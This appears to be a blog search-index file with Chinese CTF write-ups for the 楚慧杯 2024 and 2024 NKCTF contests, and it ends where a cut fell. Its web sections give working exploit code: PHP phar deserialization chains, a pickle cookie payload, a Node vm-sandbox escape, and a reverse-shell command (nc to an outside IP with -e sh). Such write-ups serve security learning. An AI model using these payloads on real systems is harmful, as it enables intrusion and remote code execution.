<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>楚慧杯 2024</title>
      <link href="/2025/01/07/%E6%A5%9A%E6%85%A7%E6%9D%AF2024/"/>
      <url>/2025/01/07/%E6%A5%9A%E6%85%A7%E6%9D%AF2024/</url>
      
        <content type="html"><![CDATA[<h1 id="楚慧杯-2024"><a href="#楚慧杯-2024" class="headerlink" title="楚慧杯 2024"></a>楚慧杯 2024</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h2><p>搜索 200找到长字符串</p><p>​<img src="/Blogimages/%E6%A5%9A%E6%85%A7%E6%9D%AF2024/network-asset-image-20250103102940651-20250106120650-4lqyud9.png" alt="image-20250103102940651">​</p><p>​<img src="/Blogimages/%E6%A5%9A%E6%85%A7%E6%9D%AF2024/network-asset-image-20250103103017872-20250106120650-qplbi7m.png" alt="image-20250103103017872">​</p><p>保存成zip</p><p>解压密码</p><p>​<img src="/Blogimages/%E6%A5%9A%E6%85%A7%E6%9D%AF2024/network-asset-image-20250103103003656-20250106120650-czwn50g.png" alt="image-20250103103003656">​</p><h2 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h2><p>cmdscan提示壁纸：</p><p><img src="/Blogimages/%E6%A5%9A%E6%85%A7%E6%9D%AF2024/wps1-20250106120729-k0qac9r.jpg">​</p><p><img src="/Blogimages/%E6%A5%9A%E6%85%A7%E6%9D%AF2024/wps2-20250106120729-qcqt4dl.jpg">​</p><p>直接下载壁纸得到flag</p><p><img src="/Blogimages/%E6%A5%9A%E6%85%A7%E6%9D%AF2024/wps3-20250106120729-pbzbjt0.jpg">​</p><p><img src="/Blogimages/%E6%A5%9A%E6%85%A7%E6%9D%AF2024/wps4-20250106120729-f4y5u64.jpg">​</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>任意文件读取读show.php</p><p>拿到反序化代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">sing</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$apple</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$range</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">range</span> <span class="token operator">==</span> <span class="token string">"range"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"apple is ?"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">apple</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">song</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$banana</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$abble</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abble</span> <span class="token operator">==</span> <span class="token string">"abble"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">banana</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ernb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">rap</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">text</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">aaabbb</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">basketball</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$payload</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag|system|php|cat|eval|tac|sort|shell|%|~|\\^|\\.|\'/i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">sing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">range</span> <span class="token operator">=</span> <span class="token string">"range"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">apple</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">song</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">apple</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">banana</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">rap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">apple</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">abble</span> <span class="token operator">=</span> <span class="token string">"abble"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">apple</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">banana</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">text</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">basketball</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">apple</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">banana</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">text</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">payload</span> <span class="token operator">=</span> <span class="token string">"passthru(\"nl /f*\");"</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'GIF89a'</span><span class="token punctuation">.</span><span class="token string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">,</span><span class="token string">'&lt;?php phpinfo();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Destruct<span class="token operator">-</span><span class="token operator">></span><span class="token property">tostring</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">call</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">get</span></code></pre><p>eval利用passthru绕过，过滤了单引号，用双引号绕过</p><p>再利用phar读取即可</p><p><img src="/Blogimages/%E6%A5%9A%E6%85%A7%E6%9D%AF2024/wps5-20250106120822-z65fwx7.jpg">​</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>主要就是一个反编译，当时没网，一直要准备pyc本地反编译都没准备，回旋镖还是来了</p><p>反编译完就很简单，一个绕R指令就可以秒了</p><p>用本地弹计算器演示：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token keyword">import</span> base64opcode<span class="token operator">=</span>b<span class="token triple-quoted-string string">'''(cossystemS'calc'o.'''</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>opcode<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>把结果用 <code>flask-session-cookie-manager</code>​编码一下就行</p><p>​<img src="/Blogimages/%E6%A5%9A%E6%85%A7%E6%9D%AF2024/image-20250106121157-8q0cz9c.png" alt="image">​</p><p>​<img src="/Blogimages/%E6%A5%9A%E6%85%A7%E6%9D%AF2024/image-20250106121218-g8stl4g.png" alt="image">​</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>这个可以扫到<code>index.php.bak</code>​</p><p>源码直接定位：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">unsafe</span> <span class="token punctuation">{</span>    public $username<span class="token punctuation">;</span>    public function __toString<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $action <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span> ?<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>        $arg <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'arg'</span><span class="token punctuation">]</span> ?<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>        $this<span class="token operator">-</span><span class="token operator">></span>username <span class="token operator">=</span> $this<span class="token operator">-</span><span class="token operator">></span>username <span class="token punctuation">.</span> <span class="token string">"hack me!"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/^[a-z0-9_]*$|\n/isD'</span><span class="token punctuation">,</span> $action<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            echo <span class="token string">"Do it another way"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>substr<span class="token punctuation">(</span>md5<span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">></span>username<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'ae471'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                $action<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> $arg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token string">"__toString was called!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>md5写个脚本跑就行</p><p>​<img src="/Blogimages/%E6%A5%9A%E6%85%A7%E6%9D%AF2024/image-20250106144210-qhsqxx9.png" alt="image">​</p><p>exp:</p><pre class=" language-python"><code class="language-python"><span class="token operator">&lt;</span>?phpsession_start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">safe</span> <span class="token punctuation">{</span>    public $password<span class="token punctuation">;</span>    public function __destruct<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        echo $this<span class="token operator">-</span><span class="token operator">></span>password<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">unsafe</span> <span class="token punctuation">{</span>    public $username<span class="token punctuation">;</span>    public function __toString<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        $action <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span> ?<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>        $arg <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'arg'</span><span class="token punctuation">]</span> ?<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span>        $this<span class="token operator">-</span><span class="token operator">></span>username <span class="token operator">=</span> $this<span class="token operator">-</span><span class="token operator">></span>username <span class="token punctuation">.</span> <span class="token string">"hack me!"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/^[a-z0-9_]*$|\n/isD'</span><span class="token punctuation">,</span> $action<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            echo <span class="token string">"Do it another way"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>substr<span class="token punctuation">(</span>md5<span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">></span>username<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'ae471'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                $action<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> $arg<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token string">"__toString was called!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>$u <span class="token operator">=</span> new safe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$u<span class="token operator">-</span><span class="token operator">></span>password <span class="token operator">=</span> new unsafe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$u<span class="token operator">-</span><span class="token operator">></span>password<span class="token operator">-</span><span class="token operator">></span>username <span class="token operator">=</span> <span class="token string">"02hFV7yAI6JP9YqsJGhZ"</span><span class="token punctuation">;</span>echo serialize<span class="token punctuation">(</span>$u<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>利用<code>create_function</code>​构造</p><p>​<img src="/Blogimages/%E6%A5%9A%E6%85%A7%E6%9D%AF2024/image-20250106145405-11ufeiq.png" alt="image">​</p><p>‍</p><p>至于FIX有点难评，把洞全修了不过，第二轮少修了几个就过了，就不写fix了，参考意义不大</p>]]></content>
      
      
      <categories>
          
          <category> 未分类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2024 NKCTF</title>
      <link href="/2024/03/26/2024%20NKCTF/"/>
      <url>/2024/03/26/2024%20NKCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="2024-NKCTF"><a href="#2024-NKCTF" class="headerlink" title="2024 NKCTF"></a>2024 NKCTF</h1><h2 id="my-first-cms"><a href="#my-first-cms" class="headerlink" title="my first cms"></a>my first cms</h2><p>后台地址：admin&#x2F;login.php</p><p>爆破密码：</p><p><img src="/Blogimages/2024NKCTF/image-20240324102100-pa3hiwm.png" alt="image">​</p><p>登陆后插件修改返回的请求头为命令执行</p><p><img src="/Blogimages/2024NKCTF/image-20240324102029-dkbugxn.png" alt="image">​</p><p><img src="/Blogimages/2024NKCTF/image-20240324102021-c7iluku.png" alt="image">​</p><h2 id="全世界最简单的CTF"><a href="#全世界最简单的CTF" class="headerlink" title="全世界最简单的CTF"></a>全世界最简单的CTF</h2><p>访问&#x2F;secret给了源码：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app    <span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'/public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">{</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>__dirname <span class="token operator">+</span> <span class="token string">'/public/home.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> pattern <span class="token operator">=</span> <span class="token regex">/(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>code<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>pattern<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"what can I say? hacker out!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">let</span> code <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>code<span class="token punctuation">;</span>    <span class="token keyword">let</span> sandbox <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> context <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">createContext</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// waf(code)</span>        <span class="token keyword">let</span> result <span class="token operator">=</span> vm<span class="token punctuation">.</span><span class="token function">runInContext</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./hack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/secret'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>__filename <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> content <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>__filename<span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> content <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>__filename<span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"listen on 3000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><p>选一个vm逃逸payload：</p><pre class=" language-js"><code class="language-js">  <span class="token keyword">const</span> err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  err<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token punctuation">{</span>    toString<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token function">apply</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> thiz<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> process <span class="token operator">=</span> args<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">"return process"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">throw</span> process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    err<span class="token punctuation">.</span>stack<span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">stdout</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    stdout<span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>禁用了字符和中括号参考<a href="https://www.anquanke.com/post/id/237032#h3-11">https://www.anquanke.com/post/id/237032#h3-11</a></p><p>payload：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> err <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>err<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token punctuation">{</span>  toString<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token function">apply</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> thiz<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> a <span class="token operator">=</span> args<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">"return global"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">const</span> b <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> Reflect<span class="token punctuation">.</span><span class="token function">ownKeys</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token operator">></span>x<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'pro'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">throw</span> Reflect<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> Reflect<span class="token punctuation">.</span><span class="token function">ownKeys</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token operator">></span>x<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'ex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"nc 43.143.251.194 9999 -e sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token 